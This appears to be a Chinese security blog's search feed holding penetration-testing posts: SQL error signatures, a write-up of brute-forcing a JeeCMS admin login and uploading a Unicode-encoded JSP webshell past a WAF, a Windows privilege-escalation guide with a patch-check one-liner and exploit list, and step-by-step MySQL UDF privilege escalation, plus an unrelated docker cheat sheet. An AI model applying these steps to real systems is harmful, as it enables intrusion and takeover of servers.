<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>不同类型数据库的报错信息</title>
      <link href="/2021-08/%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF/"/>
      <url>/2021-08/%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="不同类型数据库的报错信息"><a href="#不同类型数据库的报错信息" class="headerlink" title="不同类型数据库的报错信息"></a>不同类型数据库的报错信息</h1><p><em>参考资料：<a href="https://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html">https://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html</a></em></p><h2 id="MSSQL-ASPX-Error"><a href="#MSSQL-ASPX-Error" class="headerlink" title="MSSQL ASPX Error"></a>MSSQL ASPX Error</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server Error in &#x27;/&#x27; Application</span><br></pre></td></tr></table></figure><h2 id="MSAccess-Apache-PHP"><a href="#MSAccess-Apache-PHP" class="headerlink" title="MSAccess (Apache PHP)"></a>MSAccess (Apache PHP)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#x27;com_exception&#x27; with message Source: Microsoft JET Database Engine</span><br></pre></td></tr></table></figure><h2 id="MSAccesss-IIS-ASP"><a href="#MSAccesss-IIS-ASP" class="headerlink" title="MSAccesss (IIS ASP)"></a>MSAccesss (IIS ASP)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft JET Database Engine error &#x27;80040e14&#x27;</span><br></pre></td></tr></table></figure><h2 id="Oracle-Error"><a href="#Oracle-Error" class="headerlink" title="Oracle Error"></a>Oracle Error</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORA-00933: SQL command not properly ended</span><br></pre></td></tr></table></figure><h2 id="ODBC-Error"><a href="#ODBC-Error" class="headerlink" title="ODBC Error"></a>ODBC Error</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL-Error"><a href="#PostgreSQL-Error" class="headerlink" title="PostgreSQL Error"></a>PostgreSQL Error</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PSQLException: ERROR: unterminated quoted string at or near &quot;&#x27;&quot; Position: 1</span><br><span class="line">or</span><br><span class="line">Query failed: ERROR: syntax error at or near</span><br><span class="line">&quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure><h2 id="MS-SQL-Server-Error"><a href="#MS-SQL-Server-Error" class="headerlink" title="MS SQL Server: Error"></a>MS SQL Server: Error</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Native Client error %u201880040e14%u2019</span><br><span class="line">Unclosed quotation mark after the character string</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从报错到getshell</title>
      <link href="/2021-08/%E4%BB%8E%E6%8A%A5%E9%94%99%E5%88%B0getshell/"/>
      <url>/2021-08/%E4%BB%8E%E6%8A%A5%E9%94%99%E5%88%B0getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="从报错到getshell"><a href="#从报错到getshell" class="headerlink" title="从报错到getshell"></a>从报错到getshell</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在进行一次渗透测试任务的时候，遇到一个比较奇葩的半成品网站，web服务几乎所有功能都是internal server error，端口扫描完成后访问服务发现应该是做过反向代理。在茫然不知所措的时候，从一个404页面找到了突破口，到最后成功getshell。这里记录一下整个getshell的过程。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>收集一点网站的基本信息，可以了解网站结构，理清渗透思路。这里可以看到该网站使用的web框架、编程语言用的java，插件使用了jQuery，jQuery有xss的漏洞，但利用价值不大</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-55-10.jpg" alt="image"></p><h2 id="0x02-报错页面"><a href="#0x02-报错页面" class="headerlink" title="0x02 报错页面"></a>0x02 报错页面</h2><p>整个网站也是比较奇葩了，提供的功能倒是多，却没一个能打开的</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-27-13.jpg" alt="image"></p><p>点击就是internal server error</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-29-54.jpg" alt="image"></p><p>猜测管理后台的路径时，返回错误只有not found</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-33-36.jpg" alt="image"></p><p>之后随手在url访问路径中添加了一个<code>/</code>，返回了一个经过定制的报错页面</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-36-08.jpg" alt="image"></p><p>这里可以看到三个超链接，这里有两种思路：</p><ol><li>“后退”：网站可能通过Referer记录下跳转过来的链接，并将其作为“后退”按钮的超链接，这样的话就可能存在XSS漏洞，注入点在Referer头。于是检查一下html代码，发现后退功能是调用js的history.back()函数，这样的话就没什么利用的可能了。</li><li>“联系网站管理员”：可以尝试一下社工，但人家作为网站的管理员，套出东西的可能性不大。之前进行指纹识别的时候，是没有探测出网站使用的CMS的，这里顺手看了一下“联系网站管理员”的链接，神奇的事情就发生了：</li></ol><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_14-58-44.jpg" alt="image"></p><p>网站管理员没有更改cms默认的链接，直接告诉了我们使用的cms是啥。网上信息搜索一波，能找到jeecms的管理后台路径，默认账号密码等东西（jeecms官方论坛也可以下载到源码）</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_15-06-54.jpg" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/jeeadmin/jeecms/index.do //后台登陆</span><br><span class="line">admin/password //默认账户</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_15-13-46.jpg" alt="image"></p><h2 id="0x03-弱密码"><a href="#0x03-弱密码" class="headerlink" title="0x03 弱密码"></a>0x03 弱密码</h2><p>上面得到了cms后台路径和默认账户，不过人家管理员也没那么傻，直接使用默认账户。</p><p>但根据测试，网站是没有对登陆验证回显信息做模糊处理的（“用户名不存在”，“密码错误”），由此可枚举出管理后台存在的用户名（admin一次过）。</p><p>网站没有验证码、登陆限制等防爆破手段，但根据抓包，密码经过了md5加密。直接burpsuite跑一波，发现弱密码<code>123456</code>，成功登录。</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_15-24-32.jpg" alt="image"></p><h2 id="0x04-Getshell"><a href="#0x04-Getshell" class="headerlink" title="0x04 Getshell"></a>0x04 Getshell</h2><p>能够进入后台，主要目标就是找找网站结构、文件上传等东西了，毕竟简单粗暴，也是最快获得网站shell的方式。</p><p>最后在某功能点发现能够直接向服务器写入文件，这样事情就好办了。</p><p>创建一个jsp文件，写入小马，点击提交，一顿操作猛如虎，然后就就死活传不上去。。</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_15-32-53.jpg" alt="image"></p><p>猜测可能后台限制了文件类型，尝试将<code>.jsp</code>换成<code>.txt</code>、<code>.jpg</code>等后缀，还是传不上去，但它的文件列表里是存在jpg文件的，说明可能不是根据文件后缀进行检测，可能是检测的文件内容。</p><p>之后将后缀改回jsp，文件内容<code>123test</code>，成功创建。</p><p>瞬间清晰，网站可能存在waf，过滤危险文件内容。</p><p>如果waf是根据危险字符的内容匹配规则的话，jsp文件有一种过狗的trick：将关键内容进行<code>unicode编码</code>。</p><p>java中的字符串默认使用Unicode进行编码，因此容器执行jsp文件时，将自动对Unicode编码进行解码。</p><p>这里有两个前提条件：</p><ol><li>Java；</li><li>字符串。</li></ol><p>既然需要是Java文件，那么此文件应该需要能够被jsp所识别，所以jsp文件中的脚本开始符<code>&lt;%</code>和结束符<code>%&gt;</code>不能够被编码，不然jsp识别不了脚本语句，不会对其进行解码，直接访问会返回状态码<code>500</code>。</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_15-49-55.jpg" alt="image"></p><p>成功创建，冰蝎连接，发现网站使用root超级管理员权限（危）</p><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200330/Snipaste_2020-03-30_16-01-35.jpg" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows操作系统提权</title>
      <link href="/2021-08/Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
      <url>/2021-08/Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows操作系统提权"><a href="#Windows操作系统提权" class="headerlink" title="Windows操作系统提权"></a>Windows操作系统提权</h1><p>系统漏洞提权一般就是利用系统自身缺陷，使用shellcode来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p><ul><li>Windows的提权exp一般格式为MS08067.exe</li><li>Linux的提权exp一般格式为2.6.18-194或2.6.18.c</li></ul><h2 id="一、快速查找EXP"><a href="#一、快速查找EXP" class="headerlink" title="一、快速查找EXP"></a>一、快速查找EXP</h2><p>Windows系统漏洞微软的漏洞编号命名格式为：MS08067。MS  Micosoft的缩写，固定格式；08   表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p><p>快速查找未打补丁的exp，可以最安全的减少目标机的未知错误，以免影响业务。</p><p>命令行下执行检测未打补丁的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;vul.txt&amp;(for %i in (  KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type vul.txt|@find /i &quot;%i&quot;|| @echo vul %i)&amp;del /f /q /a vul.txt</span><br></pre></td></tr></table></figure><p>以上命令须在可写目录下执行，因为会生成临时的<code>vul.txt</code>文件。</p><p>注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</span><br><span class="line">CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</span><br><span class="line">CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</span><br><span class="line">MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</span><br><span class="line">MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</span><br><span class="line">MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</span><br><span class="line">MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</span><br><span class="line">MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</span><br><span class="line">MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</span><br><span class="line">MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</span><br><span class="line">MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</span><br><span class="line">MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</span><br><span class="line">MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012)</span><br><span class="line">MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</span><br><span class="line">MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</span><br><span class="line">MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</span><br><span class="line">MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</span><br><span class="line">MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</span><br><span class="line">MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</span><br><span class="line">MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</span><br><span class="line">MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</span><br><span class="line">MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</span><br><span class="line">MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</span><br><span class="line">MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</span><br><span class="line">MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</span><br><span class="line">MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</span><br><span class="line">MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</span><br><span class="line">MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</span><br><span class="line">MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</span><br><span class="line">MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</span><br><span class="line">MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</span><br><span class="line">MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</span><br><span class="line">MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</span><br><span class="line">MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</span><br><span class="line">MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</span><br><span class="line">MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</span><br><span class="line">MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</span><br><span class="line">MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</span><br><span class="line">MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</span><br><span class="line">MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</span><br><span class="line">MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</span><br><span class="line">MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</span><br><span class="line">MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</span><br><span class="line">MS08-066 　[]　　 []　　(Windows 2000/XP/Server 2003)</span><br><span class="line">MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</span><br><span class="line">MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</span><br><span class="line">MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</span><br><span class="line">MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</span><br></pre></td></tr></table></figure><p>已对外公开的EXP：<br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a></p><h2 id="提权EXP的使用方法"><a href="#提权EXP的使用方法" class="headerlink" title="提权EXP的使用方法"></a>提权EXP的使用方法</h2><p>使exp执行即可，一般情况下是使用cmd.exe来执行。在日常渗透测试过程中，常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p><p>一般的过程是：</p><ol><li>先找可写目录</li><li>上传cmd.exe、提权exp等工具</li><li>使用exp进行提权，加账号等操作</li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在使用webshell提权的时候要特别注意：</p><ul><li>asp的webshell要支持：wscript(wscript.shell/shell.application)</li><li>aspx可以直接调用.net组件来执行cmd的命令</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UDF提权</title>
      <link href="/2021-08/UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2021-08/UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p><font color=red>本文仅供网络安全从业者学习研究探讨使用</font></p><p><font color=red>禁止使用文中涉及到的相关技术进行非法工作！</font></p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li><li>掌握mysql数据库的账户，拥有对mysql的insert和delete权限，用于创建和抛弃函数</li><li>拥有可以将udf.dll写入相应目录的权限，mysql5.6以后的版本有个新特性：secure_file_priv，且该值不能通过sql修改。<ul><li>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的有具体值时 ，表示限制mysqld 的导入|导出只能发生在该值目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul></li></ul><p>查看secure_file_priv：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>在<code>sqlmap/data/udf/mysql/</code>下，就有可利用的EXP，需要用sqlmap下的一个python文件解密(sqlmap/extra/cloak/cloal.py)：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\cloak.py -d -i D:\sqlmap\data\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_ -o udf_windows_x64.dll</span><br></pre></td></tr></table></figure><h2 id="写入对应目录下"><a href="#写入对应目录下" class="headerlink" title="写入对应目录下"></a>写入对应目录下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show VARIABLES like &quot;%version%&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-30-58.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show VARIABLES like &quot;%secure%&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-32-56.jpg"></p><p>注意下面这个路径，是通过webshell上传的dll文件的路径，要求至少mysql对该文件有读权限。（为了方便直接放桌面了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(LOAD_FILE(&quot;C:/Users/xxx/Desktop/udf_windows_x64.dll&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-40-14.jpg"></p><p>写入lib/plugin（不同版本不一样，具体看上面的条件）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-42-38.jpg"></p><p>注意使用dumpfile函数写文件，outfile会在末尾添加空行，会破坏dll的结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&quot;&quot;) into dumpfile &quot;C:/mysql-5.7.20-winx64/lib/plugin/udf_windows_x64.dll&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-44-47.jpg"></p><p>查看是否有已经创建的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">select * from func;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-46-17.jpg"></p><p>创建自定义函数，注意创建的函数应该和dll文件内名称一样，不然会报错。dll内的文件名称可以用十六进制查看器或者dll函数查看器进行查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create FUNCTION sys_eval returns string soname &quot;udf_windows_x64.dll&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-49-12.jpg"></p><p>使用自定义函数执行语句，提权成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/md_images/20200513/Snipaste_2020-05-14_01-50-51.jpg"></p><p>删除自定义函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker快查</title>
      <link href="/2021-08/docker%E5%BF%AB%E6%9F%A5/"/>
      <url>/2021-08/docker%E5%BF%AB%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="docker快查"><a href="#docker快查" class="headerlink" title="docker快查"></a>docker快查</h1><h2 id="搜索镜象"><a href="#搜索镜象" class="headerlink" title="搜索镜象"></a>搜索镜象</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search centos7</span><br></pre></td></tr></table></figure><h2 id="拉取镜象"><a href="#拉取镜象" class="headerlink" title="拉取镜象"></a>拉取镜象</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos7</span><br></pre></td></tr></table></figure><h2 id="本地镜象"><a href="#本地镜象" class="headerlink" title="本地镜象"></a>本地镜象</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="https://wl-1301085254.cos.ap-chengdu.myqcloud.com/Snipaste_2020-03-24_17-24-56.jpg" alt="image"><br>tag 标签用来区分不同的容器，不填写的话默认是latest。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name 容器名称 -p 主机端口:容器端口 镜像名称:tag标签 /bin/bash</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">options</th><th align="center">mean</th></tr></thead><tbody><tr><td align="center">-i</td><td align="center">以交互模式运行容器，通常与 -t 同时使用</td></tr><tr><td align="center">-t</td><td align="center">为容器重新分配一个伪输入终端，通常与 -i 同时使用；</td></tr><tr><td align="center">-d</td><td align="center">后台运行容器，并返回容器ID；</td></tr><tr><td align="center">-p</td><td align="center">主机和容器端口映射</td></tr></tbody></table><h2 id="列举容器"><a href="#列举容器" class="headerlink" title="列举容器"></a>列举容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps [-a]</span><br></pre></td></tr></table></figure><p>不加<code>-a</code>，只列举运行的容器</p><h2 id="运行-停止容器"><a href="#运行-停止容器" class="headerlink" title="运行/停止容器"></a>运行/停止容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop/start 容器名/ID</span><br></pre></td></tr></table></figure><p>填写容器名则要全写上去，如果用的是ID,这里的ID并不需要写完整的ID或者16位短ID,只需要能与其他容器区分开即可，就算你只写第一个字符都是可以的，只要能区分开。</p><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it  容器ID /bin/bash</span><br></pre></td></tr></table></figure><h2 id="拷贝文件到容器"><a href="#拷贝文件到容器" class="headerlink" title="拷贝文件到容器"></a>拷贝文件到容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 主机的文件目录 容器名:容器中的目录</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中的迭代器和生成器</title>
      <link href="/2021-08/Python%E4%B8%AD%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/"/>
      <url>/2021-08/Python%E4%B8%AD%E7%9A%84%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%92%8C%E7%94%9F%E6%88%90%E5%99%A8/</url>
      
